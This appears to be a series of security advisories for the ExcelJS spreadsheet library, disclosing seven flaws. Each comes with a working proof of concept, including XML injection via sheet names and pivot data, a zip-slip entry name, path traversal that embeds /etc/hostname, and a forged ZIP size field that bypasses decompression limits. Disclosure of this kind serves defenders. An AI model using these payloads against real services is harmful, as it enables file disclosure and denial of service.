### Summary

When a workbook fails to parse in the streaming reader, the temporary files created for its worksheets are not removed. Repeated uploads accumulate files and descriptors until the process restarts.


### Details

When worksheets come before `xl/sharedStrings.xml`, the reader copies each one to a temporary file and parses them afterwards. The files are released one by one, only as each sheet is parsed successfully.

An error on one sheet, or a consumer that stops iterating early, leaves every remaining file in place.


### Proof of concept

Take a workbook with 50 sheets written by the library and replace `xl/worksheets/sheet1.xml` with:

```xml
<worksheet><sheetData><row r="1"><c r="A1"><v>1</row></sheetData>
```

```js
for (let i = 0; i < 2; i++) {
  const reader = new ExcelJS.stream.xlsx.WorkbookReader('crafted.xlsx', {
    worksheets: 'emit', sharedStrings: 'cache',
  });
  try {
    for await (const ws of reader) for await (const row of ws) { /* … */ }
  } catch (e) { /* parse error */ }
}

fs.readdirSync(os.tmpdir()).filter(f => f.startsWith('tmp-')).length;   // 100
```

Each failed read leaves one file per sheet, until the process exits.


### Impact

Denial of service of a long-running process that reads untrusted uploads with the streaming reader: the temporary directory fills, and file descriptors run out (`EMFILE`), after which the process can no longer open files or sockets.

### Summary

Sheet names are written into range references without escaping the quote character, and the streaming writer puts merged ranges into the XML without encoding. A crafted sheet name injects XML, and an ordinary name such as `Bob's data` produces an invalid reference.


### Details

A range with a sheet name is serialized as `'name'!A1:B2`. Excel requires `'` inside the name to be doubled; the library did not.

In the streaming writer, the serialized range is then inserted raw into `<mergeCell ref="…"/>`.


### Proof of concept

```js
const writer = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });
const ws = writer.addWorksheet('S');
const row = ws.addRow([1]);

ws.mergeCells(1, 1, 2, 2, `x'"/><injected/><a b="'`);

row.commit();
await ws.commit();
await writer.commit();
```

The sheet XML contains:

```xml
<mergeCell ref="'x'"/><injected/><a b="''!A1:B2"/>
```

Without any attack, `new Range(1, 1, 2, 2, "Bob's data").range` gives `'Bob's data'!A1:B2`, which is not a valid reference.


### Impact

A user-controlled sheet name reaching `mergeCells` alters the generated XML. Sheet names with an apostrophe produce references Excel cannot read.

### Summary

When a CSV is read, cells whose text equals the name of an `Object.prototype` member (`constructor`, `toString`, `__proto__`…) are replaced by native functions or objects. Writing the workbook afterwards fails.


### Details

Special values such as `true`, `false` and `#N/A` are looked up in a plain object using the raw cell text. For `constructor`, `toString` or `hasOwnProperty`, the lookup returns a function from the prototype chain, and `__proto__` returns `Object.prototype` itself.


### Proof of concept

```js
const wb = new ExcelJS.Workbook();
const input = new PassThrough();
input.end('constructor,toString,__proto__\n');

const ws = await wb.csv.read(input);

typeof ws.getCell('A1').value;   // 'function'  (expected 'constructor')

await wb.xlsx.writeBuffer();
// TypeError: Cannot read properties of undefined (reading 'richText')
```


### Impact

Data corruption on import, and a crash of any pipeline that converts such a CSV to XLSX. These words are plausible in ordinary data (glossaries, source code listings).

### Summary

`addImage` accepts any string as `extension`. It is used to build the ZIP entry name of the image and, in the streaming writer, an unescaped relationship target.


### Details

The extension is concatenated into `xl/media/image<N>.<extension>`.

In the streaming writer, the ZIP entry keeps the name verbatim, including `..` segments. In the relationship writer, the target is written without XML encoding.


### Proof of concept

```js
const wb = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });

wb.addImage({ buffer: png, extension: 'png/../../../../tmp/zipslip' });

const ws = wb.addWorksheet('S');
ws.addRow([1]).commit();
await ws.commit();
await wb.commit();
```

`out.xlsx` contains an entry named `xl/media/image0.png/../../../../tmp/zipslip`.


### Impact

A tool that extracts the generated workbook without sanitizing entry names can be made to write outside its target directory. The relationship target can also be used to alter the generated XML.

It requires the application to pass a user-controlled extension to `addImage`.

### Summary

Cell values and column headers used as the source of a pivot table are written into the pivot cache XML without escaping. A crafted value injects XML elements, and ordinary values such as `R&D <x>` produce an invalid file.


### Details

The pivot cache definition and records are built by string concatenation. Header names and shared items are placed inside attribute values as-is, so a `"` closes the attribute and a `<` or `&` breaks the document.


### Proof of concept

```js
const wb = new ExcelJS.Workbook();
const src = wb.addWorksheet('Source');
src.addRows([
  ['A', 'V'],
  ['a"/><injected foo="1', 4],
  ['R&D <x>', 5],
]);

wb.addWorksheet('Pivot').addPivotTable({
  sourceSheet: src, rows: ['A'], columns: [], values: ['V'], metric: 'sum',
});

await wb.xlsx.writeBuffer();
```

`xl/pivotCache/pivotCacheDefinition1.xml` then contains an `<injected foo="1"/>` element, and the `R&D <x>` value makes the part malformed.


### Impact

The generated workbook is corrupted, or contains elements chosen by whoever controls the source data. Excel may refuse to open the file.

### Summary

`stream.xlsx.WorkbookWriter#addImage` accepts a `filename` containing `..` segments, and embeds the file it points to into the generated workbook. `Workbook#addImage` rejects the same input.


### Details

The non-streaming writer checks `filename` for parent-directory traversal. The streaming writer does not: the path goes straight to the ZIP writer, which reads the file and stores it under `xl/media/`.


### Proof of concept

```js
const wb = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });

wb.addImage({ filename: '../../../../etc/hostname', extension: 'png' });

const ws = wb.addWorksheet('S');
ws.addRow([1]).commit();
await ws.commit();
await wb.commit();
```

`out.xlsx` now contains `xl/media/image0.png` with the content of `/etc/hostname`.

The same call on `Workbook#addImage` throws a `parent-directory traversal` error.


### Impact

Disclosure of local files readable by the Node.js process, when a path derived from user input reaches `addImage`. The file content ends up in the workbook returned to the user.

### Summary

The decompression limits applied by `xlsx.load()` can be bypassed with a crafted archive. A few hundred KB of input makes the process inflate hundreds of MB, or more, regardless of the configured limits.

### Details

The size check reads the uncompressed size declared in the ZIP central directory, a value the attacker controls.

The archive is then fully inflated into memory. Only afterwards does JSZip compare the real size with the declared one and fail with `uncompressed data size mismatch`, which is too late.

### Proof of concept

Build a ZIP whose entry `xl/media/image1.png` really inflates to 300 MB of zeros, then overwrite the uncompressed-size field of its central directory header with `10`:

```js
const zip = await JSZip.loadAsync(await validWorkbookBuffer);
zip.file('xl/media/image1.png', Buffer.alloc(300 * 1024 * 1024), { compression: 'DEFLATE' });
const buf = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });

for (let i = 0; i < buf.length - 46; i++) {
  if (buf.readUInt32LE(i) === 0x02014b50) {            // central directory header
    const n = buf.readUInt16LE(i + 28);
    if (buf.toString('utf8', i + 46, i + 46 + n) === 'xl/media/image1.png') {
      buf.writeUInt32LE(10, i + 24);                   // declared size
    }
  }
}

await new ExcelJS.Workbook().xlsx.load(buf);
```

The archive is about 312 KB. The default limits (128 MiB per entry, 512 MiB in total) are not enforced, and the process inflates the full 300 MB before failing.

### Impact

Memory exhaustion of the process that loads the file. An out-of-memory abort cannot be caught by the application.
